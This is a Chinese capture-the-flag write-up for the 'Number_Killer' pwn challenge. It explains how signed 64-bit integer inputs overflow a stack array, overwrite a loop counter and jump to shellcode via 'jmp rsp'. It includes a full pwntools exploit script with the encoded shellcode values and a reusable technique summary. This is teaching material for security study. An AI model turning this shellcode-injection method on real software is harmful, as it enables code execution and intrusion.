# Number_Killer

## 题目简述

程序循环读取有符号 `long long` 整数并把它们连续写入栈上数组。题目同时提供了 `jmp rsp`，预期把整数的 8 字节表示拼成 shellcode。可利用负数绕过“不能超过有符号正数上限”的限制，并通过栈溢出覆盖循环计数变量，使程序继续接收足够多的数据。

## 解题过程

输入的十进制整数最终按小端序保存为 8 字节，因此可以先把机器码按 8 字节分组，再把每组解释为带符号 64 位整数。部分分组最高位为 1，对应的十进制值必须写成负数。

官方解法先重复发送 13 次 `47244640256`，利用溢出后的栈布局维持合适的循环状态，再发送构成执行链和 shellcode 的整数：

```python
from pwn import *

context.arch = "amd64"

io = process("./Number_Killer")

for _ in range(13):
    io.sendline(b"47244640256")

values = [
    4196237,
    7074926021049463112,
    -1458805190845043095,
    5212724049075524360,
    5562984097417,
]

for value in values:
    io.sendline(str(value).encode())

io.interactive()
```

调试时可用下面的方式检查某个整数实际落到内存中的字节：

```python
print(p64(value & 0xffffffffffffffff))
```

当返回地址转到 `jmp rsp` 后，栈上的这些字节作为 shellcode 执行。

## 方法总结

- 核心技巧：把 64 位整数输入视为原始 8 字节写入，用栈溢出同时控制循环状态和返回地址。
- 识别信号：程序反复读整数到固定栈数组，附近有循环计数器，二进制中又存在 `jmp rsp`。
- 复用要点：构造十进制输入时要区分无符号位模式和有符号解析；最高位为 1 的 64 位块应转换为对应负数。
